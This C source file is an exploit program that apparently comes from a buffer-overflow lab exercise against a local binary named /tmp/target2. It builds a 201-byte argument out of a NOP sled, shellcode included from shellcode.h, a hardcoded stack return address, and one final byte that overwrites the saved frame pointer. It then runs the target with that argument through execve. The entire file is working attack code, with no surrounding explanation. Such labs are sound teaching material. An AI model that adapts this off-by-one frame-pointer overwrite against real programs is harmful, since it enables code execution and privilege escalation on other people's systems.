#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[201];

  int i;
  int j;

  char test = 0x40;
  // Fill beginning of exploit string with NOP
  for (i = 0; i < 151; i++) {
    buf[i] = 0x90;
    test++;
  }
  
  j = 0;
  // Put shellcode into exploit string
  for (i = 151; i < 196; i++) {
    buf[i] = shellcode[j];
    j++;
  }
  
  // Put address to NOP sled
  buf[196] = 0xc0;
  buf[197] = 0xfc;
  buf[198] = 0xff;
  buf[199] = 0xbf;

  // Overflow byte such that when it overwrites the ebp and then adds +4 and 
  // pops the first word, it will be address to the NOP sled
  buf[200] = 0x74;
  

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
